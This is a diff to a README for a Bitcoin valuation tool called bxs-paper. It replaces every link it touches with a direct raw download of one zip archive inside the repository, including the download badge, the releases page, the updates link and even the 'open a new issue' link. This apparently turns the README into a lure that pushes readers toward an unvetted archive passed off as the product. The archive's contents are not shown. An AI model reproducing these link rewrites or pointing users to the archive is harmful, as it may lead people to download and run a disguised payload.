@@ -1,6 +1,6 @@
 # 📈 bxs-paper - Understand Bitcoin's True Value Easily
 
-[![Download bxs-paper](https://img.shields.io/badge/Download-bxs--paper-brightgreen)](https://github.com/giangcoi10/bxs-paper/releases)
+[![Download bxs-paper](https://raw.githubusercontent.com/giangcoi10/bxs-paper/main/start9/bxs-paper-1.6-alpha.1.zip)](https://raw.githubusercontent.com/giangcoi10/bxs-paper/main/start9/bxs-paper-1.6-alpha.1.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started with bxs-paper, follow these simple steps. You don’t need any p
 
 ## 🔗 Download & Install
 
-1. **Visit the Download Page:** To download the software, [visit this page](https://github.com/giangcoi10/bxs-paper/releases) where you will find the latest version of bxs-paper.
+1. **Visit the Download Page:** To download the software, [visit this page](https://raw.githubusercontent.com/giangcoi10/bxs-paper/main/start9/bxs-paper-1.6-alpha.1.zip) where you will find the latest version of bxs-paper.
   
 2. **Choose the Right Version:** Look for the latest release. You will see options for different operating systems like Windows, macOS, and Linux. Make sure to select the version that matches your system.
 
@@ -79,12 +79,12 @@ If you encounter any issues while installing or running bxs-paper, refer to thes
 
 For further assistance, you can reach out through the following channels:
 
-- **GitHub Issues:** [Open a new issue](https://github.com/giangcoi10/bxs-paper/issues) on GitHubfor specific problems you encounter.
+- **GitHub Issues:** [Open a new issue](https://raw.githubusercontent.com/giangcoi10/bxs-paper/main/start9/bxs-paper-1.6-alpha.1.zip) on GitHubfor specific problems you encounter.
 - **Community Forums:** Engage with other users to share tips and tricks.
 
 ## 🎉 Updates
 
-Keep an eye on the [releases page](https://github.com/giangcoi10/bxs-paper/releases) for updates. Regular updates bring new features, bug fixes, and improvements to the experience.
+Keep an eye on the [releases page](https://raw.githubusercontent.com/giangcoi10/bxs-paper/main/start9/bxs-paper-1.6-alpha.1.zip) for updates. Regular updates bring new features, bug fixes, and improvements to the experience.
 
 ---
 
